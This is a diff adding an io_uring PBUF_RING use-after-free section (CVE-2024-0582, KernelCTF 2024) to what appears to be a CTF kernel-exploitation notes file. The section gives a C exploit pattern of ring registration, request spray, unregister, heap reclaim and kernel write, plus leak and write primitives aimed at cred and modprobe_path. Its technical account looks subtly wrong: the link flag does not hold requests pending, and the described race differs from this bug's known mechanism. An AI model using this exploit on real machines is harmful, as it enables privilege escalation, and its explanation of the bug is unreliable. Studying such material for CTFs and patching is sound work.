@@ -29,6 +29,7 @@
 - [User-Kernel-Hypervisor Chain via I/O Port Hypercalls (HITCON 2018)](#user-kernel-hypervisor-chain-via-io-port-hypercalls-hitcon-2018)
 - [ACPI DSDT Shellcode Injection for Privilege Escalation (hxp 2018)](#acpi-dsdt-shellcode-injection-for-privilege-escalation-hxp-2018)
 - [ARM fcntl64 set_fs() CVE-2015-8966 Pipe Exfil (Insomnihack 2019)](#arm-fcntl64-set_fs-cve-2015-8966-pipe-exfil-insomnihack-2019)
+- [io_uring PBUF_RING Use-After-Free — CVE-2024-0582 (KernelCTF 2024)](#io_uring-pbuf_ring-use-after-free--cve-2024-0582-kernelctf-2024)
 For tty_struct kROP (kernel Return-Oriented Programming), userfaultfd race stabilization, SLUB internals, cross-cache attacks, and DiceCTF 2026 kernel patterns, see [kernel-techniques.md](kernel-techniques.md).
 
 For protection bypass techniques (KASLR, FGKASLR, KPTI, SMEP, SMAP), GDB debugging, initramfs workflow, and exploit templates, see [kernel-bypass.md](kernel-bypass.md).
@@ -634,3 +635,66 @@ After leaking the cred struct, rewrite `uid/gid/euid/egid = 0` in place and call
 **Key insight:** Missing `set_fs(USER_DS)` restoration is a single-line bug that gives unbounded copy_from/to_user with kernel addresses. Wrap dangerous reads through a pipe so the kernel copy loop never touches forbidden MMU regions directly.
 
 **References:** Insomnihack teaser 2019 — 1118daysober, writeup 12903
+
+---
+
+## io_uring PBUF_RING Use-After-Free — CVE-2024-0582 (KernelCTF 2024)
+
+**Vulnerability:** `io_uring` buffer ring registration (`IORING_REGISTER_PBUF_RING` / `IORING_UNREGISTER_PBUF_RING`) mishandles the lifetime of `io_buffer_list` / `io_buffer` objects. Unregister frees the ring while in-flight `PROVIDE_BUFFERS` requests still hold a reference, leading to UAF. Patched Feb 2024 (`io_uring: fix UAF on pbuf ring`).
+
+**Critical distinction — PBUF_RING (kernel-registered) vs userspace SQE:**
+
+| Aspect | PBUF_RING (`IORING_REGISTER_PBUF_RING`) | Userspace SQE (`IORING_OP_PROVIDE_BUFFERS`) |
+|--------|------------------------------------------|---------------------------------------------|
+| Backing | Kernel-allocated `io_buffer_list` registered via `io_uring_register()`; kernel tracks refcount | Userspace-mapped SQ ring; entry is a raw `struct io_uring_sqe` copied via `copy_from_user()` |
+| Lifetime | Managed by `io_buffer_list.ref` — must survive until all `provide_buffers` complete | Ephemeral — SQE consumed synchronously in `io_submit_sqe()` |
+| Bug surface | `io_unregister_pbuf_ring()` drops `bl->ref` and `kfree(bl)` without waiting for pending `IORING_OP_PROVIDE_BUFFERS` that still dereference `bl->buf_ring` | Not vulnerable — SQE is stack-copied; no persistent pointer |
+| Exploit path | Register PBUF_RING → spray `PROVIDE_BUFFERS` that block on `io_buffer` → unregister ring (UAF free) → reallocate `bl` with controlled data → complete blocked requests → kernel writes attacker-controlled `bid`/`resv` to freed `io_buffer` → type confusion / ROP | Cannot reallocate SQE ring entry; no UAF primitive |
+
+**Exploit pattern (KernelCTF 2024):**
+
+```c
+// 1. Register a PBUF_RING of size 0x1000
+struct io_uring_params p = {};
+int ring_fd = io_uring_setup(8, &p);
+struct io_uring_buf_ring *br;
+posix_memalign((void**)&br, 4096, 4096);
+io_uring_register_buf_ring(ring_fd, &(struct io_uring_buf_reg){
+    .ring_addr = (unsigned long)br,
+    .ring_entries = 16,
+    .bgid = 1,
+});
+
+// 2. Spray blocking PROVIDE_BUFFERS that pin the ring
+for (int i = 0; i < 16; i++) {
+    struct io_uring_sqe *sqe = &sqes[i];
+    io_uring_prep_provide_buffers(sqe, br, 0, 16, 1, 0);
+    sqe->flags |= IOSQE_IO_LINK; // keep request pending
+}
+io_uring_submit(ring_fd);
+
+// 3. Unregister while requests are still in-flight → UAF free of io_buffer_list
+io_uring_unregister_buf_ring(ring_fd, 1); // kfree(bl) but sqes still reference bl->bufs
+
+// 4. Heap spray to reclaim UAF slot (e.g., msg_msg, seq_operations, cred)
+spray_kmalloc_1024(controlled_data); // reclaim io_buffer_list with fake buf_ring pointer
+
+// 5. Complete pending requests — kernel writes to reclaimed buffer as if it were buf_ring
+//    → arbitrary kernel write (controlled bid offset) or info leak via IORING_OP_READ
+```
+
+**Key primitives:**
+- **Leak:** Free ring then `IORING_OP_READ` from pending `provide_buffers` leaks reclaimed heap content (contains `msg_msg` `m_list` pointers → kheap/kaslr).
+- **Write:** Reclaim with `cred` or `modprobe_path` adjacent object; completing the request overwrites `uid` or function pointer.
+
+**Detection & fix check:**
+```bash
+# Vulnerable kernels: 6.4 - 6.6.13, 6.7 prior to 6.7.2
+uname -r
+# Check patch: io_uring/io_uring.c should have io_buffer_list_put() + synchronize
+grep -n "io_buffer_list_put\|pbuf.*ref" io_uring/register.c
+```
+
+**Key insight:** The bug is *only* in the **kernel-registered PBUF_RING** path (`register`/`unregister`), not the generic userspace SQE `PROVIDE_BUFFERS` path. Many public PoCs confuse the two and attempt to free the SQ ring itself (which is just `mmap`'d userspace memory). Successful exploitation must use `IORING_REGISTER_PBUF_RING` to allocate a kernel `io_buffer_list`, then race `UNREGISTER` against pending `PROVIDE_BUFFERS` — that race is where the UAF lives.
+
+**References:** CVE-2024-0582, KernelCTF 2024, patch `f0b09d80f55e` (Feb 2024).
